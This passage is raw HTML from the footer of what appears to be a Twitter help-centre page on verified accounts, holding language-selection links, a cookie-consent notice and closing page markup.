          </li>
        
          <li class="u03__region-list-item  twtr-grid__col-24  twtr-grid__col-md-8">
            <a href="https://help.twitter.com/tr/managing-your-account/about-twitter-verified-accounts" data-iso-code="tr" class="twtr-color--white-neutral  twtr-type--bold-24  has-hover">
              Türkçe 
            </a>
          </li>
        
          <li class="u03__region-list-item  twtr-grid__col-24  twtr-grid__col-md-8">
            <a href="https://help.twitter.com/fr/managing-your-account/about-twitter-verified-accounts" data-iso-code="fr" class="twtr-color--white-neutral  twtr-type--bold-24  has-hover">
              Français 
            </a>
          </li>
        
          <li class="u03__region-list-item  twtr-grid__col-24  twtr-grid__col-md-8">
            <a href="https://help.twitter.com/it/managing-your-account/about-twitter-verified-accounts" data-iso-code="it" class="twtr-color--white-neutral  twtr-type--bold-24  has-hover">
              Italiano 
            </a>
          </li>
        
          <li class="u03__region-list-item  twtr-grid__col-24  twtr-grid__col-md-8">
            <a href="https://help.twitter.com/ar/managing-your-account/about-twitter-verified-accounts" data-iso-code="ar" class="twtr-color--white-neutral  twtr-type--bold-24  has-hover">
              العربيّة
            </a>
          </li>
        
          <li class="u03__region-list-item  twtr-grid__col-24  twtr-grid__col-md-8">
            <a href="https://help.twitter.com/nl/managing-your-account/about-twitter-verified-accounts" data-iso-code="nl" class="twtr-color--white-neutral  twtr-type--bold-24  has-hover">
              Nederlands
            </a>
          </li>
        
          <li class="u03__region-list-item  twtr-grid__col-24  twtr-grid__col-md-8">
            <a href="https://help.twitter.com/id/managing-your-account/about-twitter-verified-accounts" data-iso-code="id" class="twtr-color--white-neutral  twtr-type--bold-24  has-hover">
              Bahasa Indonesia 
            </a>
          </li>
        
          <li class="u03__region-list-item  twtr-grid__col-24  twtr-grid__col-md-8">
            <a href="https://help.twitter.com/ru/managing-your-account/about-twitter-verified-accounts" data-iso-code="ru" class="twtr-color--white-neutral  twtr-type--bold-24  has-hover">
              Русский
            </a>
          </li>
        
          <li class="u03__region-list-item  twtr-grid__col-24  twtr-grid__col-md-8">
            <a href="https://help.twitter.com/hi/managing-your-account/about-twitter-verified-accounts" data-iso-code="hi" class="twtr-color--white-neutral  twtr-type--bold-24  has-hover">
              हिंदी
            </a>
          </li>
        </ul>
      </div>
    </div>
  </div>

</div>

        </div>
      </div>
    </div>
  </div>
</footer>
</div><!--/twtr-main-->





<div>

  <div class="u12-data-protection-notice" id="u12" style="position: fixed; width: 100%; bottom: 0; left: 0; z-index: 9999;">
    <div class="u12-data-protection-notice__item  u12-data-protection-notice__item--a">
      


<div>

  <div class="u10-eu-cookie-notice  js-eu-cookie-notice" id="u10">
    <div class="u10-eu-cookie-notice__item  u12-data-protection-notice__notice">
      <div class="u10-eu-cookie-notice__content">

        <div class="u10-eu-cookie-notice__copy">
          <p class="mtc-font  twtr-font  js-cookie-copy">
            By using Twitter’s services you agree to our <a href="https://help.twitter.com/en/rules-and-policies/twitter-cookies" target="_blank">Cookies Use</a>
. We use cookies for purposes including analytics, personalisation, and ads.


          </p>
        </div><!--/u10-eu-cookie-notice__copy-->

        <div class="u10-eu-cookie-notice__choice">
          <ul class="u10-eu-cookie-notice__choice-list">
            <li><button class="u10-eu-cookie-notice__button  is-blue  u10-eu-cookie-notice__button--accept  mtc-font  twtr-font  js-accept">OK</button></li>
          </ul>
        </div><!--/u10-eu-cookie-notice__choice-->

      </div><!--/u10-eu-cookie-notice__content-->


    </div>
  </div>

  

  <div class="js-eu-countries-list" data-eu-countries-list="[AT,BE,BG,CY,CZ,DK,EE,FI,FR,DE,EL,HU,IE,IT,LV,LT,LU,MT,NL,PL,PT,RO,SK,SI,ES,SE,UK,IS,NO,LI,CH]"></div>

  
    
<link rel="stylesheet" href="/etc/designs/help-twitter/eu-cookie-notice.min.css" type="text/css">

</div>

    </div><!--/u12-data-protection-notice__item-a-->

  </div><!--/u12-data-protection-notice-->

</div>


  
  
</body></html>

